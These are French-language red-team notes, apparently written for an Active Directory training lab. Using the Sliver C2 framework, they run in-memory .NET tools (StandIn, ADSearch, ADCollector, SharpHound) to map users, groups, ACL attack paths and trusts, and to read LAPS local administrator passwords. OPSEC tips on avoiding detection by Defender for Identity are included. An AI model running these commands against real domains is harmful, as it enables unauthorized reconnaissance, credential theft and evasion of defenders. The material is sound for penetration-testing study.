# Sliver - Énumération AD

> [!summary] Objectif
> Cartographier le domaine sans PowerView/SharpView (détectés), via des outils à requêtes LDAP brutes exécutés en mémoire : **StandIn** et **ADSearch** pour users/groupes/OU/ACL/trusts, **ADCollector** pour les ACL, **SharpHound** pour le graphe. Toute commande passe par `execute-assembly` (voir [[w. Sliver C2/Sliver - Exécution et évasion]]). Concepts : [[Énumération AD]].

> [!warning]- Required
> Une session migrée + les assemblies dans `C:\AD\Tools\Sliver`. Pour éviter le double hop Kerberos sur certaines requêtes, fournir `--user/--pass` du compte foothold.

### Users / groupes (StandIn, requêtes LDAP)

```bash
# Tous les users (filtre LDAP brut)
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--ldap "(&(objectCategory=person)(objectClass=user))"'

# Un objet précis + attributs choisis
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object samaccountname=administrator --filter lastlogon,description'

# Membres d'un groupe
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "(samaccountname=domain admins)" --filter member'
```

`--ldap` interroge plusieurs objets, `--object` un seul. `--filter` limite les attributs retournés (moins bruyant).

### Users / groupes / OU (ADSearch)

```bash
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/ADSearch.exe' '--search "(samaccountname=administrator)" --attributes cn,description,logoncount'

# Groupe avec creds explicites (évite le double hop)
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/ADSearch.exe' '--group "enterprise admins" --domain dollarcorp.moneycorp.local --user studentX --pass <pwd>'
```

ADSearch renvoie proprement des attributs ciblés ; pratique pour les comptes privilégiés (Domain/Enterprise Admins) et les OU/GPO.

### ACL (ADCollector / StandIn)

```bash
# Droits de modification qui pointent vers studentX
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/ADCollector.exe' '--Interest studentx'

# Vérifier ses propres droits sur un objet (ex. la racine du domaine)
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "distinguishedname=DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL" --access --ntaccount "dcorp\studentx"'
```

C'est là que se trouvent les chemins ACL (GenericWrite, WriteDACL, DCSync…) — croiser avec BloodHound.

### Trusts et forêt (ADSearch / DSQuery)

```bash
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/ADSearch.exe' '--search "(objectClass=trustedDomain)"'
```

Cartographier les trusts internes et externes de `dollarcorp` / `moneycorp` avant tout franchissement (voir [[Sliver - Kerberos et tickets]]).

### Graphe (SharpHound / BloodHound)

```bash
[server] sliver (dcorp-std_https) > armory install sharp-hound-3
execute-assembly -p explorer.exe -t 200 '/mnt/c/AD/Tools/Sliver/SharpHound.exe' '-c All'
```

Collecte fractionnée conseillée (les requêtes LDAP consécutives alertent MDI/ATP). Récupérer le zip et l'analyser dans BloodHound sur la VM d'attaque.

> [!note] OPSEC énumération
> Tout outil qui enchaîne des requêtes LDAP est visible sous MDI. Activer la verbosité une fois pour comprendre les filtres LDAP émis, puis espacer les collectes. Préférer `--object`/`--filter` (ciblé) aux dumps massifs.

### LAPS — lire le mot de passe admin local

```bash
# Machines gérées par LAPS + lecture de ms-mcs-admpwd (là où on a le droit)
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "(ms-mcs-admpwdexpirationtime=*)" --filter ms-mcs-admpwd,name'
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object samaccountname=<computer>$ --filter ms-mcs-admpwd'
```

`ms-Mcs-AdmPwd` est en clair → accès admin local direct (`winrs`/scshell) sans PtH. Repérer d'abord *qui* peut lire l'attribut (groupe délégué) via les ACL. Voir [[Cheatsheet - LAPS]].

## Related
- [[Énumération AD]]
- [[w. Sliver C2/Sliver - Exécution et évasion]]
- [[Sliver - Privesc et lateral]]
- [[Sliver - Toutes les commandes]]
